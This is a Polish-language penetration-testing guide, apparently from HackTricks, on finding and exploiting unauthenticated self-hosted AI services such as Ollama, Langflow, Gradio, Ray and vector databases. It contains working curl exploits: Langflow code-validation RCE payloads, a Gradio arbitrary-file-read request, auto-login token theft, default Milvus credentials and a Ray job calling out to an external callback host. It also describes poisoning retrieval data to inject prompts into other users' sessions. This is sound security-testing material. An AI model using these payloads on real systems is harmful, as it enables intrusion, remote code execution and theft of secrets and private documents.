# Udostępnione self-hosted usługi AI

{{#include ../banners/hacktricks-training.md}}

Zespoły tworzące funkcje AI często uruchamiają własne środowiska uruchomieniowe modeli, kreatory agentów, interfejsy demo, klastry obliczeniowe i bazy wektorowe. Wiele z tych narzędzi zaprojektowano z myślą o laptopie lub zamkniętej sieci laboratoryjnej, dlatego **domyślnie nie mają uwierzytelniania** albo mają włączone obejście uwierzytelniania. Gdy atakujący może uzyskać dostęp do takiej usługi, skutki zwykle należą do jednej z tych kategorii:

- Bezpłatne wykorzystanie GPU i modeli oraz kradzież prywatnych modeli.
- Wyciek promptów, dokumentów i embeddingów.
- Wyciek sekretów ze zmiennych środowiskowych procesu (kluczy dostawców LLM, poświadczeń chmurowych).
- Wykonanie kodu, ponieważ niektóre z tych API uruchamiają kod **jako funkcję**.

Na tej stronie opisano, jak znaleźć te usługi i co sprawdzić w każdym typie API. Informacje o wzmacnianiu zabezpieczeń self-hosted serwera inferencji i leak z llama.cpp `/slots` znajdziesz w [AI Risk Frameworks](AI-Risk-Frameworks.md#self-hosted-llm-inference-hardening). Informacje o złośliwych plikach modeli znajdziesz w [AI Models RCE](AI-Models-RCE.md).

## Fingerprinting

Wyślij te żądania bez poświadczeń. Odpowiedź JSON z oczekiwanymi polami pozwala zidentyfikować produkt, a często także jego wersję, co wskazuje, które z poniższych testów mają zastosowanie. Porty to udokumentowane wartości domyślne lub porty używane w oficjalnych przykładach uruchomienia.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

| Produkt | Typowy port | Żądanie bez uwierzytelnienia | Co go identyfikuje |
| --- | --- | --- | --- |
| Ollama | 11434 | `GET /api/version`, `GET /api/tags` | JSON z wersją, lista lokalnych modeli |
| Langflow | 7860 | `GET /api/v1/version` | JSON z wersją Langflow |
| Gradio | 7860 | `GET /config` | Konfiguracja aplikacji z wersją Gradio i identyfikatorami komponentów |
| Ray dashboard | 8265 | `GET /api/version`, `GET /api/jobs/` | `ray_version`, lista przesłanych zadań |
| Chroma | 8000 | `GET /api/v2/heartbeat`, `GET /api/v2/version` | Wartość heartbeat, wersja Chroma |
| Qdrant | 6333 | `GET /`, `GET /collections` | Wersja Qdrant, lista kolekcji |
| Weaviate | - | `GET /v1/meta`, `GET /v1/schema` | Wersja Weaviate, klasy |
| Milvus | 19530 | `POST /v2/vectordb/collections/list` | Lista kolekcji lub błąd uwierzytelniania |

Te usługi są też często udostępniane za reverse proxy pod prefiksem ścieżki (na przykład `/ollama/` lub `/ray/`), więc ponów żądania z użyciem każdego znalezionego prefiksu z bundli JavaScript lub dokumentacji API.

## API inferencji i zarządzania modelami bez uwierzytelniania

Środowiska uruchomieniowe modeli zwykle udostępniają jedno REST API łączące trasy inferencji z trasami administracyjnymi. Dobrym przykładem jest Ollama. Nie ma wbudowanego uwierzytelniania i domyślnie nasłuchuje pod adresem `127.0.0.1:11434`, natomiast `OLLAMA_HOST` zmienia adres nasłuchiwania.<sup>[[1]](#references)[[15]](#references)</sup> Oficjalny obraz Dockera ustawia wewnątrz kontenera `OLLAMA_HOST=0.0.0.0:11434`, deklaruje `EXPOSE 11434` i nie zawiera instrukcji `USER`, więc serwer działa w kontenerze jako root.<sup>[[16]](#references)</sup> `EXPOSE` nie publikuje portu na hoście, więc dostępność portu z hosta zależy od wdrożenia. Udokumentowane polecenia `docker run` używają `-p 11434:11434`, a Docker publikuje takie mapowanie na wszystkich interfejsach hosta, chyba że podano adres IP hosta.<sup>[[17]](#references)[[18]](#references)</sup>

Możliwości, jakie każda grupa tras daje atakującemu:<sup>[[2]](#references)</sup>

| Trasy | Skutek braku uwierzytelniania |
| --- | --- |
| `GET /api/tags`, `GET /api/ps` | Lista lokalnych i załadowanych modeli, w tym prywatnych modeli niestandardowych |
| `POST /api/show` | Szczegóły modelu, w tym Modelfile, szablon i **prompt systemowy** |
| `POST /api/generate`, `/api/chat`, `/api/embed` | Bezpłatna inferencja na sprzęcie ofiary |
| `POST /api/pull`, `POST /api/push` | Pobranie przez serwer modelu z rejestru wybranego przez atakującego lub przesłanie tam modelu |
| `POST /api/create`, `/api/copy`, `DELETE /api/delete` | Tworzenie, nadpisywanie lub usuwanie modeli |

```bash
curl -s http://target:11434/api/tags
curl -s http://target:11434/api/show -d '{"model":"<name from /api/tags>"}'
# Outbound fetch to a registry you control: only look for the callback
curl -s http://target:11434/api/pull -d '{"model":"<your-host>/library/test:latest","insecure":true}'
```

Lista modeli zwrócona bez poświadczeń już dowodzi ekspozycji. Niestandardowe modele często zawierają wewnętrzny prompt systemowy dostępny przez `/api/show`. Pull do Twojego hosta dowodzi, że serwer pobiera manifesty z rejestrów wskazanych przez atakującego. `/api/push` do Twojego rejestru zamienia ekspozycję w kradzież modelu. Nie wywołuj tras create ani delete na rzeczywistych celach.

Pull z rejestru to także powierzchnia ataku na parser, ponieważ serwer zapisuje bloby, używając wartości z zdalnego manifestu. W Probllama (CVE-2024-37032, poprawione w Ollama 0.1.34) pole manifestu `digest` było używane jako nazwa pliku bez walidacji. Złośliwy rejestr mógł więc zapisywać pliki poza katalogiem blobs, używając sekwencji `../`. Wysłanie spreparowanego manifestu, którego digest wskazywał na plik lokalny, spowodowało leak tego pliku do rejestru atakującego. Wiz uzyskał RCE w Dockerze, gdzie serwer działa jako root, zapisując bibliotekę współdzieloną i dodając ją do `/etc/ld.so.preload`, a następnie wywołując `/api/chat`, aby nowy proces ją załadował.<sup>[[15]](#references)</sup> Gdy runner może pobierać dane z dowolnych rejestrów, sprawdź, jak zamienia pola manifestu na ścieżki.

## APIs zaprojektowane do wykonywania kodu

Powiązane: [Nadpisywanie kodu workflow dla poszczególnych żądań w Flowise](../pentesting-web/server-side-javascript-injection.md#per-request-workflow-code-overrides-flowise).

### APIs przesyłania zadań

Frameworki obliczeń rozproszonych traktują wykonywanie kodu jako swoją główną funkcję. Ray Jobs API na porcie dashboardu (8265) przyjmuje polecenie shell w `entrypoint` i uruchamia je w klastrze.<sup>[[19]](#references)</sup> Badanie Oligo ShadowRay wskazuje, że Jobs API nie ma autoryzacji, a dashboard nasłuchuje na `0.0.0.0`. Związek z CVE-2023-48022 jest kwestionowany, ponieważ Ray ma działać wyłącznie w kontrolowanej sieci.<sup>[[20]](#references)</sup> W wersji 2.52.0 Ray dodał opcjonalne uwierzytelnianie tokenem (`RAY_AUTH_MODE=token`). Ray 2.59 domyślnie je włącza dla lokalnych klastrów uruchamianych przez `ray.init()`; `ray start --head` nadal może uruchomić się bez uwierzytelniania, jeśli nie ma dostępnego tokena. Ray dokumentuje szersze wdrożenie domyślnego uwierzytelniania w wersji 2.61, dlatego sprawdź wdrożoną wersję i tryb uruchamiania, zamiast zakładać, że dashboard jest otwarty.<sup>[[21]](#references)</sup>

```bash
curl -s http://target:8265/api/version
curl -s http://target:8265/api/jobs/   # existing entrypoints often contain secrets
# Only if the scope allows code execution: DNS callback as proof
curl -s -X POST http://target:8265/api/jobs/ -H 'Content-Type: application/json' \
  -d '{"entrypoint":"nslookup <oast-host>","runtime_env":{}}'
```

Dashboardy tego rodzaju mają też pomocnicze endpointy, które warto sprawdzić w starszych wersjach. Przed Ray 2.8.1 endpoint `/log_proxy?url=` pobierał dowolny adres HTTP(S) (SSRF do metadanych chmury), a `/api/v0/logs/file` akceptował dowolną ścieżkę w parametrze `filename`; oba działały bez uwierzytelniania.<sup>[[8]](#references)</sup>

### Endpointy „walidacji” kodu, które uruchamiają definicje funkcji

Kreatory agentów, które akceptują własne komponenty Pythona, czasem „walidują” kod, parsując go za pomocą `ast` i uruchamiając wyłącznie definicje funkcji przez `exec()`. To nie jest bezpieczne. Python oblicza **dekoratory i domyślne wartości argumentów podczas definiowania funkcji**, więc umieszczony tam kod zostanie uruchomiony, nawet jeśli ciało funkcji nigdy się nie wykona. Endpoint `POST /api/v1/validate/code` w Langflow działał w ten sposób i przed wersją 1.3.0 nie wymagał uwierzytelniania (CVE-2025-3248). Zgłoszenie wyjątku zawierającego wynik polecenia sprawia, że endpoint zwraca ten wynik w odpowiedzi:<sup>[[22]](#references)</sup>

```bash
# Decorator variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code": "@exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")\ndef foo():\n  pass"}'
# Default-argument variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code":"def foo(cmd=exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")):\n  pass"}'
```

Przetestuj każdy endpoint, który kompiluje, lintuje lub „sprawdza” kod użytkownika pod kątem tego wzorca i jako potwierdzenie wykorzystania podatności preferuj callback DNS.

### Trasy auto-logowania i domyślnego tokena superusera

Narzędzia dla jednego użytkownika często zawierają skrót, który loguje każdego odwiedzającego jako administratora. W Langflow, gdy włączona jest opcja `AUTO_LOGIN`, `GET /api/v1/auto_login` zwraca każdemu tokeny domyślnego superusera. Gdy jest wyłączona, trasa odpowiada komunikatem `Auto login is disabled.`.<sup>[[23]](#references)</sup> Langflow OSS w wersjach od 1.0.0 do 1.10.0 domyślnie miało tę opcję włączoną (CVE-2026-9103). Połączenie jej z opisaną wyżej uwierzytelnioną trasą walidacji kodu przywraca nieuwierzytelnione RCE (CVE-2026-9198, zgłoszone przez Harisha Kollę).<sup>[[24]](#references)[[25]](#references)[[33]](#references)</sup> Aktualne oficjalne pakiety wydań i obrazy Docker mają wyłączone automatyczne logowanie i wymagają hasła superusera, ale gałęzie deweloperskie nadal mają tę opcję włączoną.<sup>[[3]](#references)</sup>

```bash
TOKEN=$(curl -s http://target:7860/api/v1/auto_login | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" http://target:7860/api/v1/users/whoami
```

Nawet bez możliwości wykonywania kodu token superusera zapewnia dostęp do każdego flow i zapisanych poświadczeń dostawców. Informacje o powiązanym sprawdzeniu wymagań wstępnych w testach automatycznych znajdziesz w [Web Black-Box AI Pentester Bots](Web-Black-Box-AI-Pentester-Bots.md).

## Trasy do udostępniania plików i RPC w interfejsach demonstracyjnych ML

Frameworki do prezentacji ML udostępniają przesłane i wygenerowane pliki za pośrednictwem ogólnej trasy i pozwalają frontendowi wywoływać pomocnicze funkcje komponentów po stronie serwera. Gradio udostępnia w tym celu `/config`, `/upload` i `/file=<path>`.<sup>[[5]](#references)</sup> Warto przetestować dwa wzorce w każdym podobnym frameworku:

- **Path traversal z podkatalogu uploadu:** jeśli trasa plików sprawdza tylko, czy ścieżka zaczyna się wewnątrz folderu tymczasowego, prześlij plik, aby utworzyć podkatalog, a następnie wyjdź z niego za pomocą `../` lub `%2e%2e%2f`. Gradio w wersjach od 4.0 do 4.10 (CVE-2023-51449) było podatne na ten atak.<sup>[[26]](#references)[[27]](#references)</sup> Wyślij żądanie za pomocą `curl --path-as-is`, aby klient nie normalizował ścieżki.
- **Dowolne wywoływanie metod:** punkt końcowy, który wywołuje `getattr(component, fn_name)` z użyciem danych wejściowych użytkownika, pozwala atakującemu wywoływać wewnętrzne funkcje pomocnicze. Przed wersją 4.13.0 trasa Gradio `/component_server` działała w ten sposób. W wersjach od 4.3 do 4.12 funkcja `move_resource_to_block_cache` kopiowała dowolny plik lokalny do pamięci podręcznej, skąd można go było pobrać przez `/file=`. W wersjach od 3.47 do 3.50.2 inne funkcje pomocnicze umożliwiały odczyt plików i SSRF z pełnym odczytem odpowiedzi.<sup>[[26]](#references)[[28]](#references)</sup> Naprawiony serwer zwraca `Function not found.` dla funkcji pomocniczych, które nie są oznaczone jako funkcje serwera.<sup>[[28]](#references)</sup>

```bash
curl -s http://target:7860/config | jq '.components[].id'
curl -s http://target:7860/component_server -H 'Content-Type: application/json' \
  -d '{"component_id":"1","data":"/etc/hostname","fn_name":"move_resource_to_block_cache","session_hash":"aaa"}'
curl -s 'http://target:7860/file=<returned_path>'
```

Na Hugging Face Spaces sekrety Space są zmiennymi środowiskowymi, dlatego `/proc/self/environ` jest najcenniejszym plikiem. Horizon3 odczytał go za pomocą nagłówka HTTP `Range`.<sup>[[26]](#references)</sup>

## Bazy danych wektorowych używane przez RAG

RAG przechowuje fragmenty oryginalnych dokumentów, ich embeddings i metadane w bazie danych wektorowych, a asystent umieszcza najlepsze wyniki w swoim promptcie. Dostęp do odczytu powoduje leak **plain text prywatnych dokumentów**. Dostęp do zapisu pozwala atakującemu wstawiać fragmenty, które są później pobierane do promptów innych użytkowników, co stanowi trwały indirect prompt injection (zobacz [AI Prompts](AI-Prompts.md#third-party-or-indirect-prompt-injection)).

W przypadku samodzielnie hostowanych baz danych wektorowych sprawdź, czy skonfigurowano uwierzytelnianie lub włączono dostęp anonimowy:

- **Qdrant**: wdrożone samodzielnie instancje nasłuchują na wszystkich interfejsach bez uwierzytelniania. Po skonfigurowaniu klucz należy umieścić w nagłówku `api-key` lub przekazać jako `Authorization: Bearer`. Mogą istnieć klucze tylko do odczytu i klucze ograniczone do konkretnej kolekcji.<sup>[[11]](#references)</sup>
- **Chroma**: uwierzytelnianie jest domyślnie wyłączone. Token auth używa `Authorization` lub `X-Chroma-Token`.<sup>[[29]](#references)</sup>
- **Weaviate**: żądania bez danych uwierzytelniających są uwierzytelniane jako `user: anonymous`, gdy dostęp anonimowy jest włączony, i otrzymują uprawnienia przypisane temu użytkownikowi.<sup>[[30]](#references)</sup>
- **Milvus**: uwierzytelnianie jest wyłączone, chyba że `common.security.authorizationEnabled` ma wartość `true`. Gdy jest włączone, domyślny użytkownik `root` ma hasło `Milvus`, a format tokenu to `username:password`.<sup>[[31]](#references)[[14]](#references)</sup>

Odpowiedź zawierająca prywatne dane bez danych uwierzytelniających wskazuje na ekspozycję. Jeśli uwierzytelnianie jest włączone, osobno sprawdź, czy niezmienione konto domyślne nadal działa:<sup>[[12]](#references)[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
curl -s http://target:6333/collections
curl -s -X POST http://target:6333/collections/<name>/points/scroll -H 'Content-Type: application/json' -d '{"limit":3,"with_payload":true}'
curl -s http://target:8000/api/v2/tenants/default_tenant/databases/default_database/collections
curl -s 'http://target:<weaviate-port>/v1/objects?limit=3'
curl -s -X POST http://target:19530/v2/vectordb/collections/list -H 'Authorization: Bearer root:Milvus' -H 'Content-Type: application/json' -d '{}'
```

Sprawdź, czy payloady zawierają tekst dokumentów, identyfikatory użytkowników lub nazwy tenantów. Aby wykazać dostęp do zapisu bez zatruwania danych produkcyjnych, utwórz i natychmiast usuń pustą, wyraźnie nazwaną kolekcję — i rób to tylko wtedy, gdy zezwala na to zakres testu.

Uwierzytelnianie na tych serwerach może też nastąpić zbyt późno. W serwerze FastAPI dla Pythona w Chroma (wersje od 1.0.0 co najmniej do 1.5.8, CVE-2026-45829) endpoint tworzenia kolekcji tworzył funkcję embeddingów dostarczoną przez klienta przed sprawdzeniem uwierzytelnienia. Konfiguracja wskazująca na kontrolowany przez atakującego model Hugging Face z `trust_remote_code: true` uruchamiała kod atakującego, nawet gdy żądanie było odrzucane. Frontend Rust nie był podatny.<sup>[[32]](#references)</sup> Gdy żądanie zawiera konfigurację modelu lub wtyczki, przetestuj je bez poświadczeń i sprawdź, czy następuje żądanie wychodzące do repozytorium modelu.

## References

- [1] [Ollama — najczęściej zadawane pytania](https://github.com/ollama/ollama/blob/main/docs/faq.mdx)
- [2] [Dokumentacja API Ollama](https://github.com/ollama/ollama/blob/main/docs/api.md)
- [3] [Plik README Langflow](https://github.com/langflow-ai/langflow/blob/main/README.md)
- [4] [Kod źródłowy Langflow — endpointy API v1](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/endpoints.py)
- [5] [Kod źródłowy Gradio — routes.py](https://github.com/gradio-app/gradio/blob/main/gradio/routes.py)
- [6] [Kod źródłowy Gradio — http_server.py](https://github.com/gradio-app/gradio/blob/main/gradio/http_server.py)
- [7] [Kod źródłowy Ray — job_head.py](https://github.com/ray-project/ray/blob/master/python/ray/dashboard/modules/job/job_head.py)
- [8] [Bishop Fox — Ray, wersje 2.6.3 i 2.8.0](https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0)
- [9] [Kod źródłowy Chroma — wartości domyślne klienta Pythona](https://github.com/chroma-core/chroma/blob/main/chromadb/__init__.py)
- [10] [Kod źródłowy Chroma — endpointy serwera FastAPI](https://github.com/chroma-core/chroma/blob/main/chromadb/server/fastapi/__init__.py)
- [11] [Qdrant — bezpieczeństwo](https://qdrant.tech/documentation/security/)
- [12] [Specyfikacja OpenAPI Qdrant](https://github.com/qdrant/qdrant/blob/master/docs/redoc/master/openapi.json)
- [13] [Specyfikacja OpenAPI Weaviate](https://github.com/weaviate/weaviate/blob/main/openapi-specs/schema.json)
- [14] [Milvus — łączenie się z serwerem Milvus](https://milvus.io/docs/connect-to-milvus-server.md)
- [15] [Wiz — Probllama: podatność Ollama na zdalne wykonanie kodu (CVE-2024-37032)](https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032)
- [16] [Plik Dockerfile Ollama](https://github.com/ollama/ollama/blob/main/Dockerfile)
- [17] [Dokumentacja Docker Ollama](https://github.com/ollama/ollama/blob/main/docs/docker.mdx)
- [18] [Docker — publikowanie i udostępnianie portów](https://docs.docker.com/get-started/docker-concepts/running-containers/publishing-ports/)
- [19] [REST API Ray Jobs](https://docs.ray.io/en/latest/cluster/running-applications/job-submission/rest.html)
- [20] [Oligo — ShadowRay: pierwsza znana kampania ataków wymierzona w obciążenia AI, wykorzystana w rzeczywistych atakach](https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild)
- [21] [Uwierzytelnianie tokenem w Ray](https://docs.ray.io/en/latest/ray-security/token-auth.html)
- [22] [Horizon3.ai — Niebezpieczne w każdych warunkach: nadużycie Python Exec do nieuwierzytelnionego RCE w Langflow AI](https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/)
- [23] [Kod źródłowy Langflow — router logowania](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/login.py)
- [24] [NVD — CVE-2026-9103](https://nvd.nist.gov/vuln/detail/CVE-2026-9103)
- [25] [NVD — CVE-2026-9198](https://nvd.nist.gov/vuln/detail/CVE-2026-9198)
- [26] [Horizon3.ai — Wykorzystywanie podatności umożliwiających odczyt plików w Gradio do kradzieży sekretów z Hugging Face Spaces](https://horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/)
- [27] [Informacja o podatności Gradio GHSA-6qm2-wpxq-7qh2](https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2)
- [28] [Commit z poprawką Gradio dla `/component_server`](https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2)
- [29] [Chroma Cookbook — natywne uwierzytelnianie Chroma](https://cookbook.chromadb.dev/security/legacy-auth/)
- [30] [Weaviate — uwierzytelnianie](https://docs.weaviate.io/weaviate/configuration/authentication)
- [31] [Milvus — uwierzytelnianie dostępu użytkownika](https://milvus.io/docs/authenticate.md)
- [32] [HiddenLayer — ChromaToast uruchamiany przed uwierzytelnieniem](https://www.hiddenlayer.com/research/chromatoast-served-pre-auth)
- [33] [Biuletyn bezpieczeństwa IBM — nieuwierzytelnione zdalne wykonanie kodu przez obejście automatycznego logowania i walidację kodu (CVE-2026-9198)](https://www.ibm.com/support/pages/node/7278927)
